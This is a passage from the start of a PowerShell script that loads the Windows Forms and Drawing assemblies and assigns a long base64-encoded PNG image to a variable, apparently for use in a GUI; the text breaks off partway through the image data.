Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$base64Image = "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